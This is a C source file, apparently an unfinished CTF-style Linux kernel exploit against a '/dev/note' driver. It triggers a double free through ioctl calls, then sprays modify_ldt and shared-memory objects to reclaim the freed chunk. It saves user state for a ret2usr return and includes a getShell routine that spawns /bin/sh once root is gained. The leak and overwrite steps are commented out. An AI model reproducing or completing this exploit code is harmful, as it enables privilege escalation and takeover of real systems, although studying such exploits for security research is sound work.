#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>

#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/shm.h>

#include <linux/btrfs.h>
#include <linux/userfaultfd.h>
#include <linux/sysctl.h>
#include <linux/capability.h>
#include <linux/types.h>

#include <asm/ldt.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;

u8 WAIT()
{
    write(STDERR_FILENO, "[WAITING...]\n", 13);
    u8 c;
    read(STDIN_FILENO, &c, 1);
    return c;
}

static inline void panic(const char* msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

void getShell()
{
    if (getuid())
    {
        panic("NO ROOT");
    }
    logOK("Rooted!");
    char* argv[] = { "/bin/sh", NULL };
    char** envp = &argv[1];
    execve(argv[0], argv, envp);
}

void save_state()
{
    __asm__(
        "mov [rip + user_cs], cs\n"
        "mov [rip + user_ss], ss\n"
        "mov [rip + user_sp], rsp\n"
        "mov [rip + user_ip], %0\n"
        "pushf\n"
        "pop qword ptr [rip + user_rflags]\n" ::"r"(getShell));
    logInfo("Saved user state");
}

void pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        panic("sched_setaffinity");
    }
}

#define devfile "/dev/note"
int devfd;

struct note_data
{
    uint64_t size;
    uint64_t index;
    char* buffer;
};

enum {
    NOTE_ALLOC = 4097,
    NOTE_READ,
    NOTE_EDIT,
    NOTE_FREE
};

int note_alloc(size_t size) {
    return ioctl(devfd, NOTE_ALLOC, size);
}

int note_read(uint64_t idx, void* buffer) {
    struct note_data arg = { 0, idx, buffer };
    return ioctl(devfd, NOTE_READ, &arg);
}

int note_write(uint64_t idx, void* buffer) {
    struct note_data arg = { 0, idx, buffer };
    return ioctl(devfd, NOTE_EDIT, &arg);
}

int note_free(uint64_t idx) {
    return ioctl(devfd, NOTE_FREE, idx);
}

int shmid_open()
{
    int shmid;
    if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1)
    {
        perror("Shmget Error");
        exit(-1);
    }
    char* shmaddr = shmat(shmid, NULL, 0);
    if (shmaddr == (void*)-1)
    {
        puts("[X] Shmat Error");
        exit(0);
    }
    return shmid;
}

struct user_desc u_desc;

int main(int argc, char** argv, char** envp)
{
    devfd = open(devfile, O_RDONLY);
    if (devfd < 0) {
        panic("Can't open /dev/note");
    }


    note_alloc(0x20);
    note_alloc(0x20);
    note_free(0);
    note_free(1);
    note_free(0);
    WAIT();

    u_desc.entry_number = 0x8000 / 8; /*
    old_ldt       = mm->context.ldt;
    old_nr_entries = old_ldt ? old_ldt->nr_entries : 0;
    new_nr_entries = max(ldt_info.entry_number + 1, old_nr_entries);
    */
    u_desc.seg_32bit = 1; /*
    if (!ldt_info.seg_32bit && !allow_16bit_segments()) {
            error = -EINVAL;
            goto out;
        }
    */

    shmid_open();
    shmid_open();
    if (syscall(SYS_modify_ldt, 1, &u_desc, sizeof(u_desc))) {
        panic("syscall(SYS_modify_ldt,1,&u_desc,sizeof(u_desc)");
    }
    logOK("Alloc new new_nr_entries");

    // int id = shmid_open();
    // int id1 = shmid_open();

    // uint64_t leak[4] = { 0 };
    // note_read(0, leak);

    // if (leak[3] == 0) {
    //     panic("fail");
    // }

    // logInfo("0x%lx", leak[3]);
    // char* shmaddr = shmat(id1, NULL, 0);
    // *shmaddr = 'A';

    WAIT();
}